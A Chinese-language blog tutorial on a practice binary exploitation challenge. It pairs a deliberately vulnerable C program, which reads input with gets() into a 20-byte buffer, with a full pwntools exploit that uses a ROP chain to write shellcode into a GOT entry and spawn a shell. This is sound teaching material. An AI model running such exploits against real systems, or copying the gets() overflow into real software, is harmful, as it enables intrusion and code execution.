---
title: ROP 和 Shellcode
subtitle:
date: 2023-08-29T10:21:02+08:00
draft: false
author:
  name: CuB3y0nd
  link:
  email:
  avatar:
description:
keywords:
license:
comment: true
weight: 0
tags:
  - PWN
  - Stack
categories:
  - PWN
hiddenFromHomePage: false
hiddenFromSearch: false
summary:
resources:
  - name: featured-image
    src: featured-image.jpg
  - name: featured-image-preview
    src: featured-image-preview.jpg
toc: true
math: false
lightgallery: false
password:
message:
repost:
  enable: false
  url:
---

暂无摘要

<!--more-->

## 0x01 源码

{{< link href="/pwn_assets/reliable_shellcode-32.zip" content="reliable_shellcode-32.zip" title="Download reliable_shellcode-32.zip" download="reliable_shellcode-32.zip" card=true >}}

```c {title="source.c"}
#include <stdio.h>

void vuln() {
  char buffer[20];

  puts("Give me the input");

  gets(buffer);
}

int main() {
  vuln();

  return 0;
}
```

## 0x02 利用

老规矩。

```python
from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('./vuln-32')
p = process()
```

我们可以再次调用 `gets` 函数，不过这次要让 `gets` 函数把接收到的数据写入程序的某个
区域，一个既可读又可写的地方，例如 GOT 表就是一个不错的选择。我们只要把 GOT 表
里面一个条目的地址传给 `gets` 函数，`gets` 函数就会把我们传进去的 shellcode 写入
这个 GOT 条目的位置，这样我们就知道 shellcode 被准确写入了什么位置。最后我们把
`gets` 函数的返回地址设为 shellcode 的地址，这样返回后就可以完美执行我们刚才输入
的 shellcode 了。

通过控制 `gets` 的写入位置，我们就可以随心所欲地把 shellcode 放在想要的地方，然后
执行它。相比以前不确定的 shellcode 位置，这种方法让我们对 shellcode 的控制更加精确
可靠。

```python
rop = ROP(elf)

rop.raw('A' * 32)
rop.gets(elf.got['puts'])  # 调用 gets ，写入 puts 的 GOT 条目
rop.raw(elf.got['puts'])   # 现在我们的 shellcode 已经写到那里了，可以从那里继续运行

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

### 1x01 最终 Exploit

```python {title="exp.py"}
from pwn import *

context.log_level = 'debug'

elf = context.binary = ELF('./vuln-32')
p = process()

rop = ROP(elf)

rop.raw('A' * 32)
rop.gets(elf.got['puts'])  # 调用 gets ，写入 puts 的 GOT 条目
rop.raw(elf.got['puts'])   # 现在我们的 shellcode 已经写到那里了，可以从那里继续运行

p.recvline()
p.sendline(rop.chain())

p.sendline(asm(shellcraft.sh()))

p.interactive()
```

## 0x03 64-bit

自行尝试 :D

{{< link href="/pwn_assets/reliable_shellcode-64.zip" content="reliable_shellcode-64.zip" title="Download reliable_shellcode-64.zip" download="reliable_shellcode-64.zip" card=true >}}

## 0x04 ASLR

这种方法不用担心 ASLR 的问题，因为我们既没有使用栈，也没有直接调用 libc 函数，
只是使用了 ROP。

真正的问题是如果启用了 PIE，由于不知道 PLT 的位置，就无法调用 `gets` ，也不知道
GOT 表的位置，无法写入。

## 0x05 潜在问题

由于没有 NX 保护，GOT 表默认的权限通常是可执行的。如果你使用较新版本的内核，
例如 `5.9.0` ，默认会移除可执行权限。

因此，如果你利用失败，可以使用 `uname -r` 查看内核版本，检查是否 `≥5.9.0` ，
如果是，那你就需要找到另一个 RWX 权限的区域放置 shellcode （如果这个区域存在）。

不同的内核和保护需要针对的调整利用技术。

